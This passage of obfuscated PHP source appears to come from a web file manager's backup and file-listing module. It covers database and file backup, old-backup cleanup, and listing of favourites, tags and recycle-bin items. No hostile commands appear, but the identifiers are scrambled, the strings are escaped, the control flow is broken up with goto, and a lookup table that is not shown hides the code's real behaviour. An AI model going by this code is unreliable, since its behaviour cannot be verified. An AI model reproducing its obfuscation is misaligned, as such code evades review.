date($A°¬Ğ‹ˆ…ç[695]); if (!($FåÀáåò = Model($A°¬Ğ‹ˆ…ç[696])->lastItem())) { $FåÀáåò = $this->initData(); } else { self::$name = $FåÀáåò[$A°¬Ğ‹ˆ…ç[28]]; if ($FåÀáåò[$A°¬Ğ‹ˆ…ç[697]] == $A°¬Ğ‹ˆ…ç[83]) { self::$name = date($A°¬Ğ‹ˆ…ç[698]); $AÏˆÖêÁ¬ = 0; if (isset($FåÀáåò[$A°¬Ğ‹ˆ…ç[281]][$A°¬Ğ‹ˆ…ç[167]][$A°¬Ğ‹ˆ…ç[419]])) { $AÏˆÖêÁ¬ = (int) $FåÀáåò[$A°¬Ğ‹ˆ…ç[281]][$A°¬Ğ‹ˆ…ç[167]][$A°¬Ğ‹ˆ…ç[419]]; } if ($FåÀáåò[$A°¬Ğ‹ˆ…ç[28]] == self::$name) { Model($A°¬Ğ‹ˆ…ç[696])->remove($FåÀáåò[$A°¬Ğ‹ˆ…ç[367]]); } $FåÀáåò = $this->initData($AÏˆÖêÁ¬, $FåÀáåò[$A°¬Ğ‹ˆ…ç[699]]); } else { $this->checkStore($FåÀáåò[$A°¬Ğ‹ˆ…ç[699]]); } } self::$option = $FåÀáåò; } private function initData($C°Ì²˜‹«‡ = 0, $e¦ºŞˆ­º = '') { goto f×„÷ñºƒ; c¤ìçç»…Ş: $EÅÎ×ªìÆí[$fî×¨½Èßó[367]] = $cÖ‘ §ÍÊ‘; return $EÅÎ×ªìÆí; goto b—æŸïë‘; f×„÷ñºƒ: $fî×¨½Èßó =& $_SERVER[¬ˆÚÂ”Éğä]; $F¹¥˜ìÓ‡â = Model($fî×¨½Èßó[696])->config(); if ($e¦ºŞˆ­º && $F¹¥˜ìÓ‡â[$fî×¨½Èßó[699]] != $e¦ºŞˆ­º) { $C°Ì²˜‹«‡ = 0; } goto FğÑÌòÓ¼‹; FğÑÌòÓ¼‹: $this->checkStore($F¹¥˜ìÓ‡â[$fî×¨½Èßó[699]]); $EÅÎ×ªìÆí = array($fî×¨½Èßó[699] => $F¹¥˜ìÓ‡â[$fî×¨½Èßó[699]], $fî×¨½Èßó[28] => self::$name, $fî×¨½Èßó[697] => 0, $fî×¨½Èßó[700] => $F¹¥˜ìÓ‡â[$fî×¨½Èßó[700]], $fî×¨½Èßó[281] => array($fî×¨½Èßó[701] => array($fî×¨½Èßó[697] => 0), $fî×¨½Èßó[702] => array($fî×¨½Èßó[697] => 0, $fî×¨½Èßó[703] => 0, $fî×¨½Èßó[704] => 0, $fî×¨½Èßó[29] => $fî×¨½Èßó[33]), $fî×¨½Èßó[705] => array($fî×¨½Èßó[697] => 0, $fî×¨½Èßó[703] => 0, $fî×¨½Èßó[704] => 0), $fî×¨½Èßó[167] => array($fî×¨½Èßó[697] => 0, $fî×¨½Èßó[706] => 0, $fî×¨½Èßó[707] => 0, $fî×¨½Èßó[708] => 0, $fî×¨½Èßó[709] => 0, $fî×¨½Èßó[419] => $C°Ì²˜‹«‡)), $fî×¨½Èßó[710] => time(), $fî×¨½Èßó[449] => 0); $cÖ‘ §ÍÊ‘ = Model($fî×¨½Èßó[696])->insert($EÅÎ×ªìÆí); goto c¤ìçç»…Ş; b—æŸïë‘: } private function checkStore($Bà›¨¶Ç·§) { $fø‹ÎË’ø =& $_SERVER[¬ˆÚÂ”Éğä]; $C¯¸À‚öÅù = Model($fø‹ÎË’ø[711])->listData($Bà›¨¶Ç·§); Model($fø‹ÎË’ø[711])->checkConfig($C¯¸À‚öÅù); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¬ˆÚÂ”Éğä][696])->findByName(self::$name); } return self::$option; } public static function set($f„™÷ÍÎÌ) { $Aª¢Åš‡Ú =& $_SERVER[¬ˆÚÂ”Éğä]; $EÙæ¶‚Õö = self::get(); foreach ($f„™÷ÍÎÌ as $d©´Ü¡ØøÔ => $f‚ñš¸ğõ) { $dšôíóó’ = explode($Aª¢Åš‡Ú[91], $d©´Ü¡ØøÔ); $FÛ‹Øª“»… = count($dšôíóó’); switch ($FÛ‹Øª“»…) { case 1: $EÙæ¶‚Õö[$dšôíóó’[0]] = $f‚ñš¸ğõ; break; case 2: $EÙæ¶‚Õö[$dšôíóó’[0]][$dšôíóó’[1]] = $f‚ñš¸ğõ; break; case 3: $EÙæ¶‚Õö[$dšôíóó’[0]][$dšôíóó’[1]][$dšôíóó’[2]] = $f‚ñš¸ğõ; break; } } Model($Aª¢Åš‡Ú[696])->update($EÙæ¶‚Õö[$Aª¢Åš‡Ú[367]], $EÙæ¶‚Õö); self::$option = $EÙæ¶‚Õö; return self::$option; } public function keep() { $a¤Î“ƒÀ÷ª =& $_SERVER[¬ˆÚÂ”Éğä]; $B‰‡‡çËƒÑ = self::get(); if ($B‰‡‡çËƒÑ[$a¤Î“ƒÀ÷ª[281]][$a¤Î“ƒÀ÷ª[701]][$a¤Î“ƒÀ÷ª[697]] == $a¤Î“ƒÀ÷ª[83]) { return; } $this->backupKeep($B‰‡‡çËƒÑ); self::set(array($a¤Î“ƒÀ÷ª[712] => 1)); } private function backupKeep($f¾åÔÌ½§Ò) { goto F™ºÌÜ¼ó¿; E¼ëöè°Ç°: for ($c¬±‚”¼†… = 0; $c¬±‚”¼†… < 12; $c¬±‚”¼†…++) { $cˆ‚ŒÉ­Ó[] = date($EŒ¤ÙØ¾Æ[713], strtotime("\x2d{$c¬±‚”¼†…}\x20\155\157\x6e\x74\150\x73")); } $cˆ‚ŒÉ­Ó = array_unique($cˆ‚ŒÉ­Ó); foreach ($A‘÷ÄÎÄ§ò as $A¦×ÆÒ»Ü‘) { if (!empty($A¦×ÆÒ»Ü‘[$EŒ¤ÙØ¾Æ[28]]) && in_array($A¦×ÆÒ»Ü‘[$EŒ¤ÙØ¾Æ[28]], $cˆ‚ŒÉ­Ó)) { continue; } Model($EŒ¤ÙØ¾Æ[696])->remove($A¦×ÆÒ»Ü‘[$EŒ¤ÙØ¾Æ[367]]); $BˆèïÛ§® = "\173\151\157\72{$f¾åÔÌ½§Ò[$EŒ¤ÙØ¾Æ[699]]}\x7d\57\x64\x61\164\x61\x62\141\x73\x65\57\x62\x61\x63\x6b\x75\x70\x5f{$A¦×ÆÒ»Ü‘[$EŒ¤ÙØ¾Æ[28]]}"; IO::remove($BˆèïÛ§®, !1); } goto C×¬Â¦„; F™ºÌÜ¼ó¿: $EŒ¤ÙØ¾Æ =& $_SERVER[¬ˆÚÂ”Éğä]; $A‘÷ÄÎÄ§ò = Model($EŒ¤ÙØ¾Æ[696])->listData(); if (empty($A‘÷ÄÎÄ§ò)) { return; } goto dê°ˆ°ŒƒÖ; dê°ˆ°ŒƒÖ: $c¬±‚”¼†… = 0; $cˆ‚ŒÉ­Ó = array(); foreach ($A‘÷ÄÎÄ§ò as $A¦×ÆÒ»Ü‘) { if ($c¬±‚”¼†… >= 7) { break; } $cˆ‚ŒÉ­Ó[] = $A¦×ÆÒ»Ü‘[$EŒ¤ÙØ¾Æ[28]]; $c¬±‚”¼†…++; } goto E¼ëöè°Ç°; C×¬Â¦„: } public function db() { goto F„•¾‡„´›; aª¨¹é‹±Š: $BĞ†ø£Èê = new BackupDb(); if (!$BĞ†ø£Èê->index()) { return !1; } self::set(array($C¾öÍª…‡Ú[714] => 1)); goto FÏ¬ØéµÌ ; F„•¾‡„´›: $C¾öÍª…‡Ú =& $_SERVER[¬ˆÚÂ”Éğä]; $bØøË˜†ò£ = self::get(); if ($bØøË˜†ò£[$C¾öÍª…‡Ú[281]][$C¾öÍª…‡Ú[702]][$C¾öÍª…‡Ú[697]] == $C¾öÍª…‡Ú[83]) { return !0; } goto aª¨¹é‹±Š; FÏ¬ØéµÌ : return !0; goto FæÂÛ±Í†»; FæÂÛ±Í†»: } public function dbFile() { goto fØ‰Âö¥ˆĞ; b÷õ÷à¤ìÜ: $DËùØ®¡Ñ = new BackupDbFile(); if (!$DËùØ®¡Ñ->index()) { return !1; } self::set(array($c´°ÇøÜŞ[715] => 1)); goto eŒÎöÔ÷ Á; fØ‰Âö¥ˆĞ: $c´°ÇøÜŞ =& $_SERVER[¬ˆÚÂ”Éğä]; $cËœàé¸‰ = self::get(); if ($cËœàé¸‰[$c´°ÇøÜŞ[281]][$c´°ÇøÜŞ[705]][$c´°ÇøÜŞ[697]] == $c´°ÇøÜŞ[83]) { return !0; } goto b÷õ÷à¤ìÜ; eŒÎöÔ÷ Á: return !0; goto b‚ëó‹î¥¹; b‚ëó‹î¥¹: } public function file() { $dÚ¶öø«Œ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÂÈç²‡Ù = self::get(); if ($DÂÈç²‡Ù[$dÚ¶öø«Œ[281]][$dÚ¶öø«Œ[167]][$dÚ¶öø«Œ[697]] == $dÚ¶öø«Œ[83]) { return !0; } if (!isset($DÂÈç²‡Ù[$dÚ¶öø«Œ[700]]) || $DÂÈç²‡Ù[$dÚ¶öø«Œ[700]] == $dÚ¶öø«Œ[470]) { $eÅ´¨‡Ñ¸³ = new BackupFile(); if (!$eÅ´¨‡Ñ¸³->index()) { return !1; } } self::set(array($dÚ¶öø«Œ[716] => 1, $dÚ¶öø«Œ[697] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto EŒ˜èÊêÎé; EŒ˜èÊêÎé: $Cê”´çÁ‰ï =& $_SERVER[¬ˆÚÂ”Éğä]; $C›ÙÁ­Ù¸ = Backup::get(); self::$io = $C›ÙÁ­Ù¸[$Cê”´çÁ‰ï[699]]; goto d¬ÊŠáù¡‡; BÍ¢ë‚ïĞó: $B…´¢Ëçì = new DbManage($aª˜íĞÇÊ , $E½ö‹Ş¾Ë); $e‚Î¡ïÓÃ = TEMP_FILES . $Cê”´çÁ‰ï[717] . self::$name . $Cê”´çÁ‰ï[8]; del_dir($e‚Î¡ïÓÃ); goto c¨ëˆç½‰â; c¨ëˆç½‰â: mk_dir($e‚Î¡ïÓÃ); $A§î™°©° = $f¬Ø†Å„¥ = 0; $E¹ÁÅöÔ†µ = $B…´¢Ëçì->db()->getTables(); goto BÓ—ß‡êßÆ; d¬ÊŠáù¡‡: self::$name = $C›ÙÁ­Ù¸[$Cê”´çÁ‰ï[28]]; $aª˜íĞÇÊ  = $GLOBALS[$Cê”´çÁ‰ï[6]][$Cê”´çÁ‰ï[17]]; $E½ö‹Ş¾Ë = $this->_dbType($aª˜íĞÇÊ ); goto BÍ¢ë‚ïĞó; DÅ ½²Ö÷á: foreach ($E¹ÁÅöÔ†µ as $DãŒÚ•öÄÍ) { $Aö¥Î»Äæ = $e‚Î¡ïÓÃ . $DãŒÚ•öÄÍ . $Cê”´çÁ‰ï[725]; $FàæÕ¤Ëƒ« = null; if ($DãŒÚ•öÄÍ == $Cê”´çÁ‰ï[726] && (!isset($C›ÙÁ­Ù¸[$Cê”´çÁ‰ï[700]]) || $C›ÙÁ­Ù¸[$Cê”´çÁ‰ï[700]] == $Cê”´çÁ‰ï[470])) { $FàæÕ¤Ëƒ« = self::$io; } $f¬Ø†Å„¥ += $B…´¢Ëçì->sqlFromDb($DãŒÚ•öÄÍ, $Aö¥Î»Äæ, $E›­È¬Û±ª, $FàæÕ¤Ëƒ«); } $E›­È¬Û±ª->end(); $EæÌ©ö¯ = array($Cê”´çÁ‰ï[727] => $E½ö‹Ş¾Ë, $Cê”´çÁ‰ï[714] => 1, $Cê”´çÁ‰ï[728] => $f¬Ø†Å„¥, $Cê”´çÁ‰ï[729] => $f¬Ø†Å„¥); goto Bìïâ‹¬Éõ; Bìïâ‹¬Éõ: Backup::set($EæÌ©ö¯); return !0; goto B°æ¶¶ìƒ; BÓ—ß‡êßÆ: $E¹ÁÅöÔ†µ = array_diff($E¹ÁÅöÔ†µ, array($Cê”´çÁ‰ï[718], $Cê”´çÁ‰ï[719])); foreach ($E¹ÁÅöÔ†µ as $DãŒÚ•öÄÍ) { $A§î™°©° += $B…´¢Ëçì->model($DãŒÚ•öÄÍ)->count(); } $E›­È¬Û±ª = new Task($Cê”´çÁ‰ï[720], $Cê”´çÁ‰ï[721], $A§î™°©°, LNG($Cê”´çÁ‰ï[722]) . $Cê”´çÁ‰ï[723] . LNG($Cê”´çÁ‰ï[724])); goto DÅ ½²Ö÷á; B°æ¶¶ìƒ: } private function _dbType($FšãùÓòŒ£) { goto BÃé‹¦ßÍ×; BÃé‹¦ßÍ×: $cİ¹½¯¦ï÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $FšãùÓòŒ£ = array_change_key_case($FšãùÓòŒ£); $FèŒ¬ö¸ƒÊ = $FšãùÓòŒ£[$cİ¹½¯¦ï÷[730]]; goto CˆÇ õš‰; CˆÇ õš‰: if ($FèŒ¬ö¸ƒÊ == $cİ¹½¯¦ï÷[731]) { $eù™Ó±º‚ = explode($cİ¹½¯¦ï÷[4], $FšãùÓòŒ£[$cİ¹½¯¦ï÷[732]]); $FèŒ¬ö¸ƒÊ = $eù™Ó±º‚[0]; } $cæ‰§ğ‰®Ä = array($cİ¹½¯¦ï÷[733] => $cİ¹½¯¦ï÷[9], $cİ¹½¯¦ï÷[734] => $cİ¹½¯¦ï÷[735]); if (isset($cæ‰§ğ‰®Ä[$FèŒ¬ö¸ƒÊ])) { $FèŒ¬ö¸ƒÊ = $cæ‰§ğ‰®Ä[$FèŒ¬ö¸ƒÊ]; } goto aªŞ—ç°¸; aªŞ—ç°¸: return $FèŒ¬ö¸ƒÊ; goto dô»……”äõ; dô»……”äõ: } } class BackupDbFile { public function __construct() { } public function index() { goto f‡ã¡–í˜¸; Aé‘è†š›è: Backup::set(array($C»ßàÂïÛÆ[738] => $A…Œ‹Ã†‘´[$C»ßàÂïÛÆ[77]])); IO::move($BòŸ‘øêÃ, $e°­¤²îÔ´); $fÅ·‹Î¬Èê = CONTROLLER_DIR . $C»ßàÂïÛÆ[739]; goto a©ŒÍó‡æò; a©ŒÍó‡æò: $d¢­‹öÂ‡› = CONTROLLER_DIR . $C»ßàÂïÛÆ[740]; IO::copy($fÅ·‹Î¬Èê, $e°­¤²îÔ´ . "\142\x61\x63\x6b\165\x70\x5f{$AÀÔóÉùÀÆ}\x2f"); IO::copy($d¢­‹öÂ‡›, $e°­¤²îÔ´ . "\x62\x61\x63\x6b\x75\160\137{$AÀÔóÉùÀÆ}\x2f"); goto aÌ¡ŒîâÊÍ; dÄ‡“é¶Ñá: $BòŸ‘øêÃ = TEMP_FILES . "\142\x61\x63\153\x75\160\x5f{$AÀÔóÉùÀÆ}\x2f"; $e°­¤²îÔ´ = "\x7b\x69\157\x3a{$dÓËœ¥Â[$C»ßàÂïÛÆ[699]]}\175\57\144\x61\164\141\x62\141\x73\145\x2f"; IO::mkdir($e°­¤²îÔ´ . "\142\141\x63\x6b\x75\160\137{$AÀÔóÉùÀÆ}\57"); goto E­Ÿ÷Í°µò; f‡ã¡–í˜¸: $C»ßàÂïÛÆ =& $_SERVER[¬ˆÚÂ”Éğä]; $dÓËœ¥Â = Backup::get(); $AÀÔóÉùÀÆ = $dÓËœ¥Â[$C»ßàÂïÛÆ[28]]; goto dÄ‡“é¶Ñá; E­Ÿ÷Í°µò: $EŠÛëÃÏ¹ = new TaskFileTransfer($C»ßàÂïÛÆ[736], $C»ßàÂïÛÆ[721], 0, LNG($C»ßàÂïÛÆ[722]) . $C»ßàÂïÛÆ[412] . LNG($C»ßàÂïÛÆ[724]) . $C»ßàÂïÛÆ[737]); $EŠÛëÃÏ¹->addPath($BòŸ‘øêÃ); $A…Œ‹Ã†‘´ = IO::infoWithChildren($BòŸ‘øêÃ); goto Aé‘è†š›è; aÌ¡ŒîâÊÍ: $EŠÛëÃÏ¹->end(); Backup::set(array($C»ßàÂïÛÆ[741] => $A…Œ‹Ã†‘´[$C»ßàÂïÛÆ[77]])); return !0; goto c…—Ç±ô‰Ï; c…—Ç±ô‰Ï: } } goto bÍÁ§‰¥©; D¿» í­ÊÓ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\x6d\145" => "\x69\x6f\x5f\x73\x6f\x75\162\143\145\x5f\x6d\145\164\141", "\155\145\164\x61\106\151\145\154\144" => "\x73\157\x75\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\x69\155\145", "\x74\x69\155\145", "\x69\156\x73\145\x72\164", "\146\165\156\x63\164\151\157\156"), array("\x63\x72\x65\141\164\x65\x54\x69\155\x65", "\164\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\143\164\151\157\x6e"), array("\x76\x69\145\167\x54\x69\x6d\145", "\x74\151\155\145", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($D¦ÔÖ·êŠ) { return $this->listSource(array($_SERVER[¬ˆÚÂ”Éğä][368] => $D¦ÔÖ·êŠ)); } public function typeName($a«ˆ†‚‡‡Ä) { static $D°²³µå·Ë = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $D°²³µå·Ë[$a«ˆ†‚‡‡Ä . $_SERVER[¬ˆÚÂ”Éğä][33]]; } public function sourceListInfo($fË®ŞÙÚ, $CšëãÖóÈ† = false) { goto B¸ŸœË®Úœ; B¤ë§Ñ´‘â: if (!$fË®ŞÙÚ) { return array(); } $a®‚ñ‘µÍŠ = $this->where(array($cÈ©ÜÌ÷¢ƒ[369] => array($cÈ©ÜÌ÷¢ƒ[7], $fË®ŞÙÚ)))->select(); $this->_listDataApply($a®‚ñ‘µÍŠ, $CšëãÖóÈ†); goto CÏœ°Ëæ„; B¸ŸœË®Úœ: $cÈ©ÜÌ÷¢ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $fË®ŞÙÚ = $fË®ŞÙÚ ? $fË®ŞÙÚ : array(); $fË®ŞÙÚ = array_filter(array_unique($fË®ŞÙÚ)); goto B¤ë§Ñ´‘â; CÏœ°Ëæ„: return array_to_keyvalue($a®‚ñ‘µÍŠ, $cÈ©ÜÌ÷¢ƒ[369]); goto f˜Ó‚Üø…¿; f˜Ó‚Üø…¿: } public function pathInfoFilter($b‹Æâ¤Şçå) { goto eÁîõÛˆ‡ñ; eÁîõÛˆ‡ñ: $BÙ”Êù‘Œ =& $_SERVER[¬ˆÚÂ”Éğä]; $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[75]] = KodIO::make($b‹Æâ¤Şçå[$BÙ”Êù‘Œ[369]]); $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[29]] = $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[370]] == 1 ? $BÙ”Êù‘Œ[76] : $BÙ”Êù‘Œ[167]; goto dŠß»ÅõÎ; cØÉè¹…: if (isset($b‹Æâ¤Şçå[$BÙ”Êù‘Œ[376]]) && $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[376]][$BÙ”Êù‘Œ[377]] == -1) { $fñ•İÍØ = array_remove_value($fñ•İÍØ, $BÙ”Êù‘Œ[187]); $fñ•İÍØ = array_remove_value($fñ•İÍØ, $BÙ”Êù‘Œ[107]); $fñ•İÍØ = array_remove_value($fñ•İÍØ, $BÙ”Êù‘Œ[378]); $fñ•İÍØ = array_remove_value($fñ•İÍØ, $BÙ”Êù‘Œ[379]); $fñ•İÍØ = array_remove_value($fñ•İÍØ, $BÙ”Êù‘Œ[77]); $fñ•İÍØ = array_remove_value($fñ•İÍØ, $BÙ”Êù‘Œ[380]); } $b‹Æâ¤Şçå = array_field_key($b‹Æâ¤Şçå, $fñ•İÍØ); return $b‹Æâ¤Şçå; goto C­ªƒµí—–; f¨Ÿéë™ø: $Cß‡’‚ªå½ .= $BÙ”Êù‘Œ[374]; $Cß‡’‚ªå½ .= $BÙ”Êù‘Œ[375]; $fñ•İÍØ = explode($BÙ”Êù‘Œ[47], $Cß‡’‚ªå½); goto cØÉè¹…; dŠß»ÅõÎ: $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[371]] = $this->typeName($b‹Æâ¤Şçå[$BÙ”Êù‘Œ[371]]); if ($b‹Æâ¤Şçå[$BÙ”Êù‘Œ[370]] != 1) { $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[160]] = $b‹Æâ¤Şçå[$BÙ”Êù‘Œ[372]]; unset($b‹Æâ¤Şçå[$BÙ”Êù‘Œ[372]]); } $Cß‡’‚ªå½ = $BÙ”Êù‘Œ[373]; goto f¨Ÿéë™ø; C­ªƒµí—–: } public function listUserFav() { goto B‡Ê ”ˆÓĞ; B‡Ê ”ˆÓĞ: $b¥Î¥ò¾ =& $_SERVER[¬ˆÚÂ”Éğä]; $bÆÒõ‹•ƒ = Model($b¥Î¥ò¾[381])->listData(); $BÊÒàÊ›“© = array_filter_by_field($bÆÒõ‹•ƒ, $b¥Î¥ò¾[29], $b¥Î¥ò¾[382]); goto fØç‰±Úš‘; fØç‰±Úš‘: $BÊÒàÊ›“© = array_to_keyvalue($BÊÒàÊ›“©, $b¥Î¥ò¾[33], $b¥Î¥ò¾[75]); if ($BÊÒàÊ›“©) { $fŠÑßÖ™É = $this->listSource(array($b¥Î¥ò¾[383] => array($b¥Î¥ò¾[384], $BÊÒàÊ›“©))); } $fŠÑßÖ™É = array_to_keyvalue($fŠÑßÖ™É[$b¥Î¥ò¾[354]], $b¥Î¥ò¾[369]); goto d·æ¡ºÑÄ; d·æ¡ºÑÄ: foreach ($bÆÒõ‹•ƒ as &$B´Šß‚Ë’) { $B´Šß‚Ë’ = array($b¥Î¥ò¾[385] => $B´Šß‚Ë’[$b¥Î¥ò¾[367]], $b¥Î¥ò¾[386] => $B´Šß‚Ë’[$b¥Î¥ò¾[28]], $b¥Î¥ò¾[387] => $B´Šß‚Ë’[$b¥Î¥ò¾[75]], $b¥Î¥ò¾[388] => $B´Šß‚Ë’[$b¥Î¥ò¾[29]], $b¥Î¥ò¾[389] => $B´Šß‚Ë’[$b¥Î¥ò¾[187]], $b¥Î¥ò¾[390] => $B´Šß‚Ë’[$b¥Î¥ò¾[107]]); if ($B´Šß‚Ë’[$b¥Î¥ò¾[29]] == $b¥Î¥ò¾[382] && $fŠÑßÖ™É[$B´Šß‚Ë’[$b¥Î¥ò¾[75]]]) { $B´Šß‚Ë’[$b¥Î¥ò¾[391]] = $fŠÑßÖ™É[$B´Šß‚Ë’[$b¥Î¥ò¾[75]]]; } } unset($B´Šß‚Ë’); return $bÆÒõ‹•ƒ; goto BŞ¿·ÆÇ‚; BŞ¿·ÆÇ‚: } public function listUserTag($EµÃùøºç‰) { goto bØ†Şè©ÃÌ; A†”È÷©: $dŞº—¶Àª† = array_to_keyvalue($B³½îïƒĞ–[$fñâ’’…™”[73]], $fñâ’’…™”[33], $fñâ’’…™”[369]); $f–è›ÄŸß­ = array_merge($dŞº—¶Àª†, $c¨ÓÃÓğÑ×); foreach ($dçîÚç…… as $f¥è¬ŠÂÆ£) { if (!in_array($f¥è¬ŠÂÆ£, $f–è›ÄŸß­)) { $c¯é‘«´ç[] = $f¥è¬ŠÂÆ£; } } goto Bä¦²ÈÕÚ; EÊÜÙÍ©˜: $aÏˆÄ©ÂÔÀ = array(); foreach ($Båª‹É‰Š‡ as $e¢“‹ò™ñ«) { $f¥è¬ŠÂÆ£ = $e¢“‹ò™ñ«[$fñâ’’…™”[75]]; if (!$f¥è¬ŠÂÆ£) { continue; } if (!isset($aÏˆÄ©ÂÔÀ[$f¥è¬ŠÂÆ£])) { $aÏˆÄ©ÂÔÀ[$f¥è¬ŠÂÆ£] = array(); } $aÏˆÄ©ÂÔÀ[$f¥è¬ŠÂÆ£][] = $e¢“‹ò™ñ«[$fñâ’’…™”[393]]; } $dçîÚç…… = array(); goto eƒÃªª³•; eƒÃªª³•: foreach ($aÏˆÄ©ÂÔÀ as $b÷ÖˆÇˆ»Ğ => $E‘…ŠÓ‡èÓ) { $CÖ¾áÀÑï = !0; if (!$EµÃùøºç‰) { $dçîÚç……[] = $b÷ÖˆÇˆ»Ğ; continue; } foreach ($EµÃùøºç‰ as $FÀ´´ó‹ò) { if (!in_array($FÀ´´ó‹ò, $E‘…ŠÓ‡èÓ)) { $CÖ¾áÀÑï = !1; break; } } if ($CÖ¾áÀÑï) { $dçîÚç……[] = $b÷ÖˆÇˆ»Ğ; } } if (!$dçîÚç……) { return array(); } $B³½îïƒĞ– = $this->listSource(array($fñâ’’…™”[383] => array($fñâ’’…™”[384], $dçîÚç……))); goto aìÙ‰™‹í; Bä¦²ÈÕÚ: if ($c¯é‘«´ç) { Model($fñâ’’…™”[394])->removeBySource($c¯é‘«´ç); } return $B³½îïƒĞ–; goto CÙé†öÀ›Ÿ; bØ†Şè©ÃÌ: $fñâ’’…™” =& $_SERVER[¬ˆÚÂ”Éğä]; if ($EµÃùøºç‰ && !is_array($EµÃùøºç‰)) { $EµÃùøºç‰ = array($EµÃùøºç‰); } $Båª‹É‰Š‡ = Model($fñâ’’…™”[392])->listData(); goto EÊÜÙÍ©˜; aìÙ‰™‹í: if (!$B³½îïƒĞ– || count($dçîÚç……) == $B³½îïƒĞ–[$fñâ’’…™”[351]][$fñâ’’…™”[352]]) { return $B³½îïƒĞ–; } $c¯é‘«´ç = array(); $c¨ÓÃÓğÑ× = array_to_keyvalue($B³½îïƒĞ–[$fñâ’’…™”[74]], $fñâ’’…™”[33], $fñâ’’…™”[369]); goto A†”È÷©; CÙé†öÀ›Ÿ: } public function listUserRecycle() { $C¶ç†Ñ· =& $_SERVER[¬ˆÚÂ”Éğä]; $B½ê´êÎ = Model($C¶ç†Ñ·[395])->listData(); if (!$B½ê´êÎ) { return array(); } $E¹ÂõŞà‘ = array($C¶ç†Ñ·[383] => array($C¶ç†Ñ·[384], $B½ê´êÎ), $C¶ç†Ñ·[396] => 1); return $this->listSource($E¹ÂõŞà‘); } public function listSource($Fìªáöõ‚Í, $Cëß áÃŸñ = 3000) { goto e¿³ÄïŒÂù; A§İƒ•â›¢: return $AÓ¦¨‰Å±; goto eŸÇ¦ˆ¥Òë; fã §¯—°š: $AÓ¦¨‰Å± = $this->field($E»•ÉµèÉ)->_makeOrder()->where($Fìªáöõ‚Í)->selectPage($Cëß áÃŸñ); $this->_listDataApply($AÓ¦¨‰Å±[$CÆ‘ôŒ¸¨œ[354]]); $this->_listMake($AÓ¦¨‰Å±); goto A§İƒ•â›¢; e¿³ÄïŒÂù: $CÆ‘ôŒ¸¨œ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($Fìªáöõ‚Í[$CÆ‘ôŒ¸¨œ[397]])) { $Fìªáöõ‚Í[$CÆ‘ôŒ¸¨œ[397]] = 0; } $E»•ÉµèÉ = $CÆ‘ôŒ¸¨œ[398]; goto fã §¯—°š; eŸÇ¦ˆ¥Òë: } protected function _makeOrder() { goto F… §¨”; eÃ¡§–®’: if ($FìãßÀøİÄ == $dßæìä–×É[28]) { } $cµÙ±î¸İ = $dßæìä–×É[409] . $AãŸÕÊƒ²Ë[$FìãßÀøİÄ] . $dßæìä–×É[50] . $dçŞÛ‰¬Êª[$FÑ‰í¶’Òî]; return $this->order(rtrim(trim($cµÙ±î¸İ), $dßæìä–×É[47])); goto cò‘øÕ‡×œ; F… §¨”: $dßæìä–×É =& $_SERVER[¬ˆÚÂ”Éğä]; $C‡Í‚éØæ = Model($dßæìä–×É[399])->get($dßæìä–×É[400]); $FåÏŠšÀÈ” = Model($dßæìä–×É[399])->get($dßæìä–×É[401]); goto F£Ë°º—àƒ; e´àçÉùŠ: $FÑ‰í¶’Òî = Input::get($dßæìä–×É[408], $dßæìä–×É[7], $FåÏŠšÀÈ”, array_keys($dçŞÛ‰¬Êª)); if (!in_array($FìãßÀøİÄ, array_keys($AãŸÕÊƒ²Ë))) { $FìãßÀøİÄ = $dßæìä–×É[28]; } if (!in_array($FÑ‰í¶’Òî, array_keys($dçŞÛ‰¬Êª))) { $FìãßÀøİÄ = $dßæìä–×É[402]; } goto eÃ¡§–®’; F£Ë°º—àƒ: $dçŞÛ‰¬Êª = array($dßæìä–×É[402] => $dßæìä–×É[403], $dßæìä–×É[404] => $dßæìä–×É[405]); $AãŸÕÊƒ²Ë = array($dßæìä–×É[28] => $dßæìä–×É[28], $dßæìä–×É[77] => $dßæìä–×É[77], $dßæìä–×É[160] => $dßæìä–×É[372], $dßæìä–×É[378] => $dßæìä–×É[378], $dßæìä–×É[406] => $dßæìä–×É[379], $dßæìä–×É[187] => $dßæìä–×É[187], $dßæìä–×É[107] => $dßæìä–×É[107]); $FìãßÀøİÄ = Input::get($dßæìä–×É[407], $dßæìä–×É[7], $C‡Í‚éØæ, array_keys($AãŸÕÊƒ²Ë)); goto e´àçÉùŠ; cò‘øÕ‡×œ: } protected function _listDataApplyItem($bè—½Ÿ©â°, $e¹Êº‚¶¡ = false) { $e¡ ÌáŒËö = array($bè—½Ÿ©â°); $this->_listDataApply($e¡ ÌáŒËö, $e¹Êº‚¶¡); return $e¡ ÌáŒËö[0]; } protected function _listDataApply(&$Dó¿ç·óÔ­, $aá»šï¼Ó§ = false) { goto f®Œ‹¦âêå; dŸÌÒí‚ñö: $cÕŸ§Û‰Áª = array_unique($cÕŸ§Û‰Áª); $this->_listSourceCache($Dó¿ç·óÔ­); if (!$aá»šï¼Ó§) { $this->_listAppendMeta($Dó¿ç·óÔ­, $cÕŸ§Û‰Áª); $this->_listAppendFileMeta($Dó¿ç·óÔ­, $cÕŸ§Û‰Áª); 